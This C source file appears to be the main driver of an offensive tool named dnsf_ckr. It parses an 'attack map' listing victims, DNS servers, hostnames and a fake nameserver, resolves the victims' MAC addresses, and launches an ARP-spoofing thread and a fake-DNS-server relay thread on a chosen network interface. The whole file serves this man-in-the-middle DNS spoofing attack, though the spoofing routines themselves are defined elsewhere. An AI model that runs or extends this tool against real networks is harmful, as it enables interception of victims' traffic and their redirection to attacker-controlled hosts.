#include "dnscore.h"
#include "conf.h"
#include "types.h"
//#include "sk.h"
#include "arpspf.h"
#include "if.h"
#include "netbots.h"
#include "ctxs.h"
#include "sockio.h"
#include "watchdogs.h"
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <pthread.h>
#include <execinfo.h>
#include <unistd.h>

pthread_attr_t spf_thread_attr, rly_thread_attr;

pthread_t spf_thread, rly_thread;

void sigint_watchdog(int sig) {
    dnsf_ckr_request_abort();
    printf("\n________________________________________\n"
           "dnsf_ckr INFO: exiting... please wait...\n");
}

void sigsegv_watchdog(int signo) {
    size_t size;
    void *array[50];
    printf("*** SIGSEGV PANIC ***\n\n");
    size = backtrace(array, 50);
    backtrace_symbols_fd(array, size, STDERR_FILENO);
    printf("\n\n");
    exit(1);
}

FILE *get_attack_map_fp(const char *option) {
    FILE *fp = fopen(option, "rb");
    return fp;
}

void start_nbots(dnsf_ckr_victims_ctx *victims,
                 dnsf_ckr_servers_ctx *servers,
                 dnsf_ckr_hostnames_set_ctx *hostnames,
                 dnsf_ckr_realdnstransactions_ctx *transactions,
                 dnsf_ckr_fakenameserver_ctx *fakenameserver,
                 char *iface) {
    struct dnsf_ckr_bot_routine_ctx spf_args, rly_args;
    int sent_nr = 3, timeout = 1;

    //  the spoofing thread routine arguments...
    spf_args.arg[0] = transactions;
    spf_args.arg[1] = iface;
    spf_args.arg[2] = &timeout;
    spf_args.arg[3] = &sent_nr;

    //  the relay thread routine arguments...
    rly_args.arg[0] = transactions;
    rly_args.arg[1] = fakenameserver;

    pthread_attr_init(&spf_thread_attr);
    pthread_create(&spf_thread, &spf_thread_attr, dnsf_ckr_arp_spoofing_bot_routine, &spf_args);

    pthread_attr_init(&rly_thread_attr);
    pthread_create(&rly_thread, &rly_thread_attr, dnsf_ckr_fakeserver_bot_routine, &rly_args);

    pthread_join(spf_thread, NULL);
    pthread_join(rly_thread, NULL);
}

int main(int argc, char **argv) {
    FILE *fp = NULL;
    int a;
    dnsf_ckr_realdnstransactions_ctx *transactions = NULL;
    dnsf_ckr_victims_ctx *victims = NULL;
    dnsf_ckr_servers_ctx *servers = NULL;
    dnsf_ckr_hostnames_set_ctx *hostnames = NULL;
    dnsf_ckr_fakenameserver_ctx *fakenameserver = NULL;
    char iface[0xff];
    int exit_code = 0;

    if (argc > 1) {
        memset(iface, 0, sizeof(iface));
        for (a = 1; a < argc; a++) {
            if (strstr(argv[a], "--") != argv[a]) {
                printf("dnsf_ckr WARNING: invalid option format -> %s <- bypassing it...\n", argv[a]);
                continue;
            }
            if (strstr(argv[a], "--attack-map=") == argv[a]) {
                fp = get_attack_map_fp(argv[a] + strlen("--attack-map="));
                if (fp == NULL) {
                    printf("dnsf_ckr ERROR: unable to load file at \"%s\"\n", argv[a] + strlen("--attack-map="));
                    return 1;
                }
            } else if (strstr(argv[a], "--iface=") == argv[a]) {
                strncpy(iface, argv[a] + strlen("--iface="), sizeof(iface) - 1);
            } else if (strcmp(argv[a], "--help") == 0) {
                printf("use: %s --attack-map=<filepath> --iface=<iface name> | --help | --version\n", argv[0]);
                if (fp != NULL) {
                    fclose(fp);
                }
                return 1;
            } else if (strcmp(argv[a], "--version") == 0) {
                printf("dnsf_ckr-%s\n", DNSF_CKR_VERSION);
                if (fp != NULL) {
                    fclose(fp);
                }
                return 1;
            } else {
                printf("dnsf_ckr WARNING: silly option -> %s <-\n", argv[a]);
            }
        }
    }

    if (fp == NULL) {
        printf("dnsf_ckr ERROR: any attack map supplied!... aborting.\n");
        return 1;
    }

    if (iface[0] == 0) {
        printf("dnsf_ckr ERROR: any network interface name supplied!... aborting.\n");
        fclose(fp);
        return 1;
    }

    victims = dnsf_ckr_get_victims_config(fp);
    if (victims == NULL) {
        fclose(fp);
        return 1;
    }

    servers = dnsf_ckr_get_servers_config(fp);
    if (servers == NULL) {
        del_dnsf_ckr_victims_ctx(victims);
        fclose(fp);
        return 1;
    }

    hostnames = dnsf_ckr_get_hostnames_config(fp);
    if (hostnames == NULL) {
        del_dnsf_ckr_victims_ctx(victims);
        del_dnsf_ckr_servers_ctx(servers);
        fclose(fp);
        return 1;
    }

    fakenameserver = dnsf_ckr_get_fakenameserver_config(fp, victims, hostnames);
    if (fakenameserver == NULL) {
        del_dnsf_ckr_victims_ctx(victims);
        del_dnsf_ckr_servers_ctx(servers);
        del_dnsf_ckr_hostnames_set_ctx(hostnames);
        fclose(fp);
    }

    transactions = dnsf_ckr_get_realdnstransactions_config(fp, victims, servers);
    if (transactions == NULL) {
        del_dnsf_ckr_victims_ctx(victims);
        del_dnsf_ckr_servers_ctx(servers);
        del_dnsf_ckr_hostnames_set_ctx(hostnames);
        fclose(fp);
    }

    signal(SIGINT, sigint_watchdog);
    signal(SIGTERM, sigint_watchdog);
    signal(SIGHUP, sigint_watchdog);
    signal(SIGSEGV, sigsegv_watchdog);

    printf("dnsf_ckr INFO: Initializing...\n");

    if ((exit_code = (dnsf_ckr_get_mac_of_victims_and_servers(&victims, &servers, iface) == 0))) {
        printf("dnsf_ckr UPSET STATUS: bye! :(\n");
    } else {
        fclose(fp);
        fp = NULL;
        dnsf_ckr_init_sockio(iface);
        start_nbots(victims, servers, hostnames, transactions, fakenameserver, iface);
        dnsf_ckr_fini_sockio();
    }
    del_dnsf_ckr_victims_ctx(victims);
    del_dnsf_ckr_servers_ctx(servers);
    del_dnsf_ckr_hostnames_set_ctx(hostnames);
    del_dnsf_ckr_realdnstransactions_ctx(transactions);
    if (fp != NULL) {
        fclose(fp);
    }

    printf("dnsf_ckr INFO: Finished.\n");
    return exit_code;
}
